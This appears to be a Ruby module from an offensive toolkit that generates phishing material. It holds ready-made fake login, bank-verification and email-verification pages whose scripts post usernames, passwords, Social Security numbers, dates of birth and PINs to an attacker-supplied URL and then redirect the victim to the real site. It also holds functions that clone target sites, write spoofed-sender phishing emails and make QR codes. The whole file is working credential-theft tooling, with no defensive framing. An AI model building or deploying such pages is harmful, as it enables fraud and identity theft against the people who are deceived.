require 'uri'
require 'net/http'
require 'base64'
require_relative '../utils/colorize'

class Phishing
  def self.generate_phishing_page(target_url, phishing_url, template = 'login')
    templates = {
      login: <<~HTML
        <!DOCTYPE html>
        <html>
        <head>
          <title>Login Required</title>
          <style>
            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 50px; }
            .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
            button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer; }
            button:hover { background: #0056b3; }
          </style>
        </head>
        <body>
          <div class="container">
            <h2>Please Login</h2>
            <form method="POST" action="#{phishing_url}">
              <input type="text" name="username" placeholder="Username" required>
              <input type="password" name="password" placeholder="Password" required>
              <button type="submit">Login</button>
            </form>
          </div>
          <script>
            document.querySelector('form').addEventListener('submit', function(e) {
              e.preventDefault();
              var formData = new FormData(this);
              fetch('#{phishing_url}', {
                method: 'POST',
                body: formData
              }).then(function() {
                window.location = '#{target_url}';
              });
            });
          </script>
        </body>
        </html>
      HTML,
      bank: <<~HTML
        <!DOCTYPE html>
        <html>
        <head>
          <title>Bank Security Verification</title>
          <style>
            body { font-family: Arial, sans-serif; background: #e8f4f8; padding: 50px; }
            .container { max-width: 500px; margin: 0 auto; background: white; padding: 40px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .header { color: #0066cc; border-bottom: 2px solid #0066cc; padding-bottom: 10px; margin-bottom: 20px; }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
            button { width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 3px; cursor: pointer; font-size: 16px; }
            .warning { background: #fff3cd; padding: 15px; border-radius: 3px; margin-bottom: 20px; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <h2>Security Verification Required</h2>
            </div>
            <div class="warning">
              <strong>Important:</strong> Please verify your account to continue.
            </div>
            <form method="POST" action="#{phishing_url}">
              <input type="text" name="account" placeholder="Account Number" required>
              <input type="text" name="ssn" placeholder="Social Security Number" required>
              <input type="text" name="dob" placeholder="Date of Birth (MM/DD/YYYY)" required>
              <input type="password" name="pin" placeholder="PIN" required>
              <button type="submit">Verify Account</button>
            </form>
          </div>
          <script>
            document.querySelector('form').addEventListener('submit', function(e) {
              e.preventDefault();
              var formData = new FormData(this);
              fetch('#{phishing_url}', {
                method: 'POST',
                body: formData
              }).then(function() {
                window.location = '#{target_url}';
              });
            });
          </script>
        </body>
        </html>
      HTML,
      email: <<~HTML
        <!DOCTYPE html>
        <html>
        <head>
          <title>Email Verification</title>
          <style>
            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 50px; }
            .container { max-width: 450px; margin: 0 auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
            button { width: 100%; padding: 10px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer; }
          </style>
        </head>
        <body>
          <div class="container">
            <h2>Verify Your Email</h2>
            <p>Please enter your email credentials to continue.</p>
            <form method="POST" action="#{phishing_url}">
              <input type="email" name="email" placeholder="Email Address" required>
              <input type="password" name="password" placeholder="Password" required>
              <button type="submit">Verify</button>
            </form>
          </div>
          <script>
            document.querySelector('form').addEventListener('submit', function(e) {
              e.preventDefault();
              var formData = new FormData(this);
              fetch('#{phishing_url}', {
                method: 'POST',
                body: formData
              }).then(function() {
                window.location = '#{target_url}';
              });
            });
          </script>
        </body>
        </html>
      HTML
    }
    
    html = templates[template.to_sym] || templates[:login]
    filename = "phishing_#{template}_#{Time.now.to_i}.html"
    File.write(filename, html)
    puts Colorize.green("Phishing page saved: #{filename}")
    filename
  end

  def self.generate_clone_page(target_url)
    begin
      response = Network.http_request(target_url)
      return nil unless response
      
      html = response.body
      html.gsub!(/action="[^"]*"/, "action=\"#{target_url}\"")
      html.gsub!(/href="[^"]*"/, "href=\"#{target_url}\"")
      
      filename = "cloned_#{URI(target_url).host.gsub('.', '_')}_#{Time.now.to_i}.html"
      File.write(filename, html)
      puts Colorize.green("Cloned page saved: #{filename}")
      filename
    rescue => e
      nil
    end
  end

  def self.generate_short_url(long_url, service = 'bitly')
    short_services = {
      'bitly' => "https://bit.ly/",
      'tinyurl' => "https://tinyurl.com/",
      'isgd' => "https://is.gd/"
    }
    
    puts Colorize.yellow("Short URL service: #{service}")
    puts Colorize.yellow("Original URL: #{long_url}")
    puts Colorize.yellow("Note: Actual shortening requires API keys")
    
    { original: long_url, service: service }
  end

  def self.generate_qr_code(url, filename = nil)
    filename ||= "qr_code_#{Time.now.to_i}.png"
    qr_data = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=#{URI.encode_www_form_component(url)}"
    
    begin
      uri = URI(qr_data)
      response = Net::HTTP.get_response(uri)
      
      if response.code == '200'
        File.binwrite(filename, response.body)
        puts Colorize.green("QR code saved: #{filename}")
        return filename
      end
    rescue => e
    end
    
    nil
  end

  def self.generate_email_template(target_name, sender_name, subject, body, phishing_url)
    email = <<~EMAIL
      From: #{sender_name} <noreply@#{sender_name.downcase.gsub(' ', '')}.com>
      To: #{target_name}
      Subject: #{subject}
      Date: #{Time.now.strftime('%a, %d %b %Y %H:%M:%S %z')}
      MIME-Version: 1.0
      Content-Type: text/html; charset=UTF-8

      <html>
      <body>
        #{body}
        <p><a href="#{phishing_url}">Click here</a></p>
      </body>
      </html>
    EMAIL
    
    filename = "email_#{Time.now.to_i}.eml"
    File.write(filename, email)
    puts Colorize.green("Email template saved: #{filename}")
    filename
  end
end

